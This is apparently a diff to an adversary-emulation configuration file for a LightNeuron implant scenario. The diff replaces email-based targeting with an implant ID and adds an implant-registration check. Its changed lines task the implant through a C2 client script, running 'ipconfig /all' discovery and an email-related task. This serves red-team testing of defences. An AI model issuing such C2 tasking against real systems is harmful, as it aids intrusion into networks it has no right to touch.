@@ -1034,7 +1167,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task info@#{network.domain.name}.local '5 | ipconfig /all' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{lightneuron.implant.id} '5 | ipconfig /all' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_lightneuron_registered:
+      - source: lightneuron.implant.id
 
 - id: fdcbcf07-0487-4757-8b09-6c1ce93220b9
   name: Send emails (User)
@@ -1107,4 +1243,7 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task info@#{network.domain.name}.local '3 | 0' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{lightneuron.implant.id} '3 | 0' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_lightneuron_registered:
+      - source: lightneuron.implant.id
